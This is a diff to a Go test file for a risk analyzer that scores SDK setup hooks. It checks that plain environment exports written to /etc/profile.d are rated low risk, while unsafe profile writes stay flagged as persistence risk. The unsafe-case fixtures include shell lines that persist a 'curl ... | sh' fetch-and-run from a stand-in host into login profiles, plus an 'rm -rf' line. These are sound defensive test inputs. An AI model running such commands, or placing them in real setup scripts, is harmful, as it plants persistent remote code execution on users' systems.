@@ -104,6 +104,63 @@ func TestCriticalExfiltrationSetsRiskFloorAndSourceSinkHighlights(t *testing.T) 
 	}
 }
 
+func TestStaticProfileEnvironmentWriteIsCalibratedToLowRisk(t *testing.T) {
+	t.Parallel()
+
+	for _, content := range []string{
+		"printf 'export FIXTURE=1\\n' > /etc/profile.d/fixture.sh\n",
+		"printf 'export FIXTURE=1\\n' | tee /etc/profile.d/fixture.sh\n",
+		"cat <<'EOF' > /etc/profile.d/fixture.sh\nexport FIXTURE=1\nEOF\n",
+	} {
+		item := analyzedSDK(t, content, sdk.HookSetupBase)
+		findings := finding.AnalyzeSDK(item)
+		profile := findFinding(findings, "risk.profile-environment-write")
+		if profile == nil || profile.Severity != "low" || profile.Weight != 10 || profile.Confidence != "high" {
+			t.Fatalf("profile finding = %#v; all = %#v", profile, findings)
+		}
+		if generic := findFinding(findings, "risk.persistence-write"); generic != nil {
+			t.Fatalf("profile write was counted twice: %#v", findings)
+		}
+		assessment := finding.AssessSDK(item, findings)
+		if assessment.Risk.Score != 10 || assessment.Risk.Level != "low" {
+			t.Errorf("profile assessment = %#v", assessment)
+		}
+	}
+}
+
+func TestUnsafeProfileWritesRemainGenericPersistenceRisk(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		hook    sdk.HookName
+		content string
+	}{
+		{name: "remote redirect", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile > /etc/profile.d/fixture.sh\n"},
+		{name: "remote pipeline", hook: sdk.HookSetupBase, content: "curl https://example.invalid/profile | tee /etc/profile.d/fixture.sh\n"},
+		{name: "unknown content", hook: sdk.HookSetupBase, content: "printf '%s' \"$PROFILE_CONTENT\" > /etc/profile.d/fixture.sh\n"},
+		{name: "executable payload", hook: sdk.HookSetupBase, content: "printf 'curl https://example.invalid/payload | sh' > /etc/profile.d/fixture.sh\n"},
+		{name: "arbitrary script", hook: sdk.HookSetupBase, content: "printf 'rm -rf /tmp/fixture' > /etc/profile.d/fixture.sh\n"},
+		{name: "heredoc payload", hook: sdk.HookSetupBase, content: "cat <<'EOF' > /etc/profile.d/fixture.sh\ncurl https://example.invalid/payload | sh\nEOF\n"},
+		{name: "dynamic heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$PROFILE_CONTENT\nEOF\n"},
+		{name: "partial path", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > \"/etc/profile.d/$PROFILE_NAME.sh\"\n"},
+		{name: "project lifecycle", hook: sdk.HookSetupProject, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.sh\n"},
+		{name: "global profile", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile\n"},
+		{name: "non shell suffix", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.conf\n"},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			findings := finding.AnalyzeSDK(analyzedSDK(t, test.content, test.hook))
+			if generic := findFinding(findings, "risk.persistence-write"); generic == nil || generic.Severity != "medium" {
+				t.Fatalf("generic persistence finding = %#v; all = %#v", generic, findings)
+			}
+			if profile := findFinding(findings, "risk.profile-environment-write"); profile != nil {
+				t.Fatalf("unsafe write was lowered: %#v", profile)
+			}
+		})
+	}
+}
+
 func TestLifecycleRiskAndAssuranceUseHookContext(t *testing.T) {
 	t.Parallel()
 	item := analyzedSDK(t, "printf changed > /project/generated\n", sdk.HookCheckHealth)
